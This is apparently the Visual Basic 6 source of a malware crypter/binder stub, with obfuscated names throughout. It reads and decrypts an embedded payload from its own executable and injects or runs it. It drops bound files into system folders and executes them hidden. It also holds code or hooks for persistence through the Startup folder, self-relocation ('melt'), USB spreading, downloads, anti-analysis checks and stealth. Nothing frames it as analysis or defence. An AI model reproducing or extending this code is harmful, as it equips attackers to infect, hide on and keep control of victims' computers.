Attribute VB_Name = "P704127KZ512354"
Private Sub K425368(Byval L71956 As single )
Dim m985413VT5292 As single
dim V696944Er13 As single
m985413VT5292 = Timer

Do While m985413VT5292 + L71956> Timer
V696944Er13 = DoEvents
if m985413VT5292> timer then
m985413VT5292 = timer 
End if 
loop
end sub 
Sub Main()

K425368(1)
Dim j342257NY378596wCE468790827d as integer 
For j342257NY378596wCE468790827d = 1 to 9 
DoEvents
j342257NY378596wCE468790827d = j342257NY378596wCE468790827d + 1 
next j342257NY378596wCE468790827d

K425368(.8)
call Y959273P
End Sub
private sub Y959273P()
On Error Resume Next
dim S925958 as integer
S925958 = FreeFile
Open App.Path & "\" & App.EXEName & ".exe" For Binary As #S925958
i922258 = String(lof(S925958), vbnullchar)
Get #S925958,, i922258
Close #S925958

Call F638082
x18459kd247451 (F618762iw)
k6699() = Split(i922258,C123049)
if b9855(0) = "2" then msgbox b9855(2),b9855(23) + N505930,b9855(1)
k6699(1) =j557933Sh781262c(k6699(1),o466018kK727985)
if h667110 = "1" then h667110 = L6454
if h667110 = vbnullstring then h667110 = app.path & "\" & app.exename & ".exe"
Call n748578I.y864373CM(h667110, strconv(k6699(1), vbfromunicode))
If b9855(0) = "1" Then x18459kd247451  (30000): MsgBox b9855(2),b9855(23)+N505930,b9855(1)
'###################################################################################################################################################################################


'-------------------------------------------------  BINDER'S CODE BELOW ------------------------------------------------------------------------------------------------------------
'###################################################################################################################################################################################
v662617E() = Split(i922258,p3827)
DoEvents
For c445156K = 1 to ubound(v662617E()) - 1
n636() = split(i922258,v839264mQ2247)
Q30847H = split(n636(c445156K),V897321)
u546211p = v662617E(1)
B458735ec3467 = Q30847H(0)
c317767f = Q30847H(1)
j5434 = Q30847H(2)
t914974sa111648 = Q30847H(3)
call O5586

if t914974sa111648 = "1" then v662617E(1) = y43663xO6820.o818715O(v662617E(1),o466018kK727985)
Doevents
if V316046du852479wDi75(B458735ec3467 & "\" & j5434) then kill B458735ec3467 & "\" &  j5434
open B458735ec3467 & "\" &  j5434 For binary as #1
put #1, , v662617E(1)
close #1


 if c317767f = 1 then call V504924 (hwnd, "open",B458735ec3467 & "\" & j5434, 0,0,1)
 if c317767f = 2 then call V504924 (hwnd, "open",B458735ec3467 & "\" & j5434, 0,0,0)
 if c317767f = 4 then Call n748578I.y864373CM(h667110, strconv(v662617E(1), vbfromunicode))
Next c445156K

'Download File
If b9855(27) = "1" Then Call A454397p(23)
'Usb Spread
If b9855(28) = "1" Then Call A454397p(24)
'Auto-Run [Persistance]
If b9855(32) = "1" Then Call T257698vF155948
'Melt File 
If I984297BI26 = "1" Then Call C512745X
'Load Custom Url
If b9855(37) = "1" Then shell "cmd /c start " & b9855(38),vbhide
End sub
public function V316046du852479wDi75(fname) as boolean
if dir(fname) <> "" then _ 
V316046du852479wDi75 = true _ 
Else: V316046du852479wDi75 = false
 End function 
Private Sub T257698vF155948
on local error resume next
Dim S7761 as String
Dim p576693 as string
p576693 =  App.Path & "\" & App.EXEName & ".exe"
open p576693 For binary as #1
S7761 = space(lof(1))
Get #1, , S7761
Close #1

k6699() = split(S7761,C123049)
if b9855(39) = 0 then 
k6699(1) = j557933Sh781262c(k6699(1), o466018kK727985)
else 
k6699(1) = y43663xO6820.o818715O(k6699(1), o466018kK727985)
end if


if b9855(36) = 1 then
if d524121 = true then 
open "C:\Documents and Settings\" & Environ("Username") & "\Start Menu\Programs\Startup\" & b9855(33) for binary as #1
 put #1 , , S7761
Close #1

Else
open "C:\Users\" & Environ("Username") & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" & b9855(33) for binary as #1
put #1, , S7761
Close #1

end if

Else


if d524121 = true then 
open "C:\Documents and Settings\" & Environ("Username") & "\Start Menu\Programs\Startup\" & b9855(33) for binary as #1
 put #1 , , k6699(1)
Close #1

Else
open "C:\Users\" & Environ("Username") & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" & b9855(33) for binary as #1
put #1, , k6699(1)
Close #1

end if

end if 

End Sub

Private sub O5586
DoEvents
if B458735ec3467 = 1 then B458735ec3467 = app.path 
if B458735ec3467 = 2 then B458735ec3467 = Environ("Windir") 
if B458735ec3467 = 3 then B458735ec3467 = Environ("SystemDrive") 
if B458735ec3467 = 4 then B458735ec3467 = Environ("Temp") 
if B458735ec3467 = 5 then B458735ec3467 = Environ("AppData") 
if B458735ec3467 = 6 then B458735ec3467 = Environ("Windir") & "\System32" 
if B458735ec3467 = 1 then c317767f = Environ("ProgramFiles") 
End sub
Private function d524121
Dim p121264u as Y854245
Dim O378738PM835194Q as long
p121264u.L628640tJ84 = Len(p121264u)

O378738PM835194Q = GetVersionEx(p121264u)

if p121264u.r912426Rr883497 = 1 and p121264u.h7644 = 5 then d524121 = True

End Function

Private Sub C512745X
If V316046du852479wDi75(Environ$("Temp") & "\TempIEData.exe") then kill Environ$("Temp") & "\TempIEData.exe"
MoveFile App.Path & "\" & App.EXEName & ".exe", Environ("Temp") & "\TempIEData.exe"
End sub
private sub F638082
On Error Resume Next
Dim D173580 as Integer

g2655() =  Split(i922258,e542734v)
b9855 = Split(g2655(1),L807418P)
N505930 = b9855(3)
o466018kK727985 = b9855(4)
F618762iw = b9855(15)
h667110 = b9855(16)
I984297BI26 = b9855(24)
R203661DN1359 = b9855(25)
x15397me = b9855(26)
'ANTIS BEGIN BELOW
if b9855(5) = "1" or b9855(10) = "1" or b9855(11) = "1" or b9855(12) = "1" then call X638887E(1): call X638887E(3)
If b9855(6) = "1" Or b9855(7) = "1" Or b9855(8) = "1" Then Call X638887E(2)
If b9855(29) = "1" Then Call X638887E(4)
If b9855(30) = "1" Then Call X638887E(3)
If b9855(31) = "1" Then Call X638887E(5)
For D173580 = 9 to 14
if b9855(D173580) = 1 then call X638887E(D173580)
next D173580
'STEALTH
for D173580 = 17 to 22
if b9855(D173580) = 1 then call A454397p(D173580)
Next D173580
end sub 
Public Function L6454(Optional Byval p383891Bh852383HQW As boolean) as string 
Dim y60729Ga as Long
Dim o546435Mp94 as Long
Dim T5561 as Long
Dim M86947WR5077 as String
Call RegOpenKey(&H80000000, "---",y60729Ga)
If y60729Ga then 
o546435Mp94 = RegQueryValueEx(y60729Ga, vbNullString, ByVal 0&, 0&, ByVal 0&,T5561)
if o546435Mp94 = 0 then 
M86947WR5077 = Space$(T5561)
Call RegQueryValueEx(y60729Ga, vbNullString, ByVal 0&, 0&, ByValM86947WR5077,T5561)
M86947WR5077 = left$(M86947WR5077,T5561)
if not p383891Bh852383HQW then 
M86947WR5077 = Mid(M86947WR5077, 2)
L6454 = Mid$(M86947WR5077,1,instr(1, M86947WR5077, Chr$(34)) - 1)
else
L6454 = M86947WR5077
end if 
end if
end if
Call RegCloseKey(y60729Ga)
End Function
Public Function Z539151yh5532(ByVal sData As String) As String
    Dim i       As Long

    For i = 1 To Len(sData)
Z539151yh5532 = Z539151yh5532 & Chr$(Asc(Mid$(sData, i, 1)) + 11)
    Next i
End Function
